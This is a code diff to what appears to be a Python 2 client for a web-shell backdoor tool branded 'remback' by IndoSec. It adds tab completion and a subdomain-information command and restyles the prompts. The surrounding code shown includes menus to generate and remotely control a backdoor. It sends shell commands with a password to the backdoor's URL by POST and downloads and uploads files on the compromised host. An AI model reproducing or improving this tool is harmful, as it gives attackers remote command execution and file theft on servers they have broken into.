@@ -4,17 +4,35 @@ from colorama import init, Fore, Back, Style
 from prettytable import PrettyTable
 from requests import post
 from time import sleep
+import readline
+import json
+import sys
 import os
 import re
-import sys
-import json
-
 
 init(autoreset=True) #autoreset colorama
 
 reload(sys)
 sys.setdefaultencoding('utf8')
 
+class MyCompleter(object):  # Custom completer
+
+    def __init__(self, options):
+        self.options = sorted(options)
+
+    def complete(self, text, state):
+        if state == 0:  # on first trigger, build possible matches
+            if text:  # cache matches (entries that start with entered text)
+                self.matches = [s for s in self.options 
+                                    if s and s.startswith(text)]
+            else:  # no text entered, all matches possible
+                self.matches = self.options[:]
+
+        # return match indexed by state
+        try: 
+            return self.matches[state]
+        except IndexError:
+            return None
 
 def cls():
     os.system('cls' if os.name=='nt' else 'clear')
@@ -42,6 +60,7 @@ def help():
 
     print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "info\t\t\t: information gathering")
     print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "show\t\t\t: show dir and folder User-Friendly")
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "subdo\t\t\t: get information subdomain target")
     print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "download <file>\t\t: download file ")
     print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "upload <path/file>\t\t: download file ")
     print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "cd <dir>\t\t\t: change directory ")
@@ -111,10 +130,14 @@ def connect():
         sleep(2)
         print(Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Backdoor Is Connected..\n")
 
-        command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
+        command = Fore.LIGHTCYAN_EX + "┌[remback" + Fore.LIGHTYELLOW_EX + "@" + Fore.LIGHTRED_EX + "IndoSec]~[" + Fore.LIGHTGREEN_EX + getdir + Fore.LIGHTRED_EX + "]\n" + Fore.LIGHTCYAN_EX + "└" + Fore.LIGHTYELLOW_EX + "#" + Fore.WHITE + " "
         result = ""
         
         while True:
+                completer = MyCompleter(["upload", "command", "download", "show", "info", "clear", "subdo", "exit"])
+                readline.set_completer(completer.complete)
+                readline.parse_and_bind('tab: complete')
+
                 cmd = raw_input(command).rstrip()
 
                 if cmd == "exit":
@@ -169,8 +192,8 @@ def connect():
                     output = fiturcd(cmd, getdir)
                     getdir = post(url, data={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
                     result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
-                    command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
-                
+                    command = Fore.LIGHTCYAN_EX + "┌[remback" + Fore.LIGHTYELLOW_EX + "@" + Fore.LIGHTRED_EX + "IndoSec]~[" + Fore.LIGHTGREEN_EX + getdir + Fore.LIGHTRED_EX + "]\n" + Fore.LIGHTCYAN_EX + "└" + Fore.LIGHTYELLOW_EX + "#" + Fore.WHITE + " "
+
                 elif(fiturdownload(cmd, getdir) != False):
                     getname = re.match(r'download (.*)', cmd, re.M|re.I)
                     output = fiturdownload(cmd, getdir)
@@ -188,9 +211,7 @@ def connect():
                         result = Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Download File.."              
                     else:
                         result = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Download file!"
-                    
-                        
-
+                                 
                 elif(fiturupload(cmd, getdir) != False):
                     getname = re.match(r'upload (.*)', cmd, re.M|re.I)
                     filename = getname.group(1).split('/')[-1]
@@ -209,8 +230,7 @@ def connect():
                             result = Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Upload File.."
                         else:
                             result = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Upload file!"
-                        
-                        
+                            
                     except:
                         print( Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Can't open file!")
                     
@@ -248,7 +268,7 @@ try:
         print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "1. " + Fore.WHITE + "Generate Backdoor")
         print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "2. " + Fore.WHITE + "Remote Backdoor")
         print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "3. " + Fore.WHITE + "Bypass Shell Exec (Coming Soon)")
-        action = raw_input("\n\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92mChoose the options\033[91m]\n\033[96m└\033[93m#\033[97m ")
+        action = raw_input(Fore.LIGHTCYAN_EX + "\n┌[remback" + Fore.LIGHTYELLOW_EX + "@" + Fore.LIGHTRED_EX + "IndoSec]~[" + Fore.LIGHTGREEN_EX + "Choose the options" + Fore.LIGHTRED_EX + "]\n" + Fore.LIGHTCYAN_EX + "└" + Fore.LIGHTYELLOW_EX + "#" + Fore.WHITE + " ")
         if action == "1":
             cls()
             banner()
